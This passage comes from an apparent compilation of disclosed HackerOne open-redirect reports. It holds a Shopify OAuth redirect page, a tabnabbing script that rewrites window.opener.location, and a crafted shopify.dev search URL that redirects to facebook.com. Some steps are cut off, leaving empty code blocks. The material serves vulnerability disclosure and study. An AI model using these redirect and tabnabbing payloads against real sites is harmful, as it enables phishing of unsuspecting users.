<html><body>You are being <a href="https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&amp;signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb">redirected</a></body></html>
```

## #984947 Tab nabbing via window.opener.location (target "_blank") — automattic — - — Open Redirect
Source: `hackerone/reports/2020/984947.md` (https://hackerone.com/reports/984947)

```
<script>
window.opener.location = 'https://davidebove.com/blog/2016/05/05/target_blank-vulnerability-test-page/';
</script>
```

## #842035 Open Redirect in  www.shopify.dev Environment  — shopify — - — Open Redirect
Source: `hackerone/reports/2021/842035.md` (https://hackerone.com/reports/842035)

```
4) Right click on first result displayed as 
```

```
6) Final link will look like this
```

```
7) alternatively You can also directly  access below link for your convenience
https://shopify.dev/search/result?query=poc&rank=1&result_gid=ae6c33f6-62d4-4ff2-966e-96c09267ee87&result_url=@www.facebook.com&search_uuid=34eeea9d-2b99-4f86-bf00-807efd4036ba&suggested=false


Culprit for redirect is 
```

